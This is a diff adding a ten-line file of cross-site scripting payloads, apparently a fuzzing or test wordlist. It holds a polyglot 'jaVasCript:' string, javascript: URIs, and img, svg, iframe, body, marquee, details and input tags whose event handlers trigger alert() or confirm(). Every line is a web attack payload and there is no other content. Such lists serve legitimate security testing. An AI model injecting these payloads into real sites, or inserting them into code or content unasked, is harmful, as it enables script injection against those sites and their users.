@@ -1,0 +1,10 @@
+jaVasCript:/*-/*/*/*'/*"/*--></noscript></title></textarea></script></style>--><p/onclick=[8].map(confirm)(1)>
+javascript:alert(document.domain)
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><script>alert(1)</script>
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(1)>
+<marquee onstart=alert(1)></marquee>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
